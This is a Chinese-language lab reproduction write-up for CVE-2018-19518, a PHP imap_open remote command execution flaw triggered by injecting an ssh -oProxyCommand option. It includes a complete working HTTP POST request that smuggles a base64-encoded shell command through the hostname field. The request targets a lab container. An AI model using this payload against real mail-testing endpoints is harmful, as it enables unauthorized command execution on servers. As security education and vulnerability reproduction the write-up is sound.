# PHP imap 远程命令执行漏洞（CVE-2018-19518）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->代码执行

### 0x01漏洞介绍			

​			php imap扩展用于在PHP中执行邮件收发操作。其`imap_open`函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。

因为ssh命令中可以通过设置`-oProxyCommand=`来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。

### 0x02漏洞复现

访问主页

环境启动后，访问`http://your-ip:8080`即可查看web页面。Web功能是测试一个邮件服务器是否能够成功连接，需要填写服务器地址、用户名和密码。

发送如下数据包即可成功执行命令`echo '1234567890'>/tmp/test0001`：

```
POST / HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
```

![PHP_imap_远程命令执行漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_imap_远程命令执行漏洞_1.jpg)

![PHP_imap_远程命令执行漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_imap_远程命令执行漏洞_2.png)

![PHP_imap_远程命令执行漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_imap_远程命令执行漏洞_3.jpg)

![PHP_imap_远程命令执行漏洞_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PHP_imap_远程命令执行漏洞_4.jpg)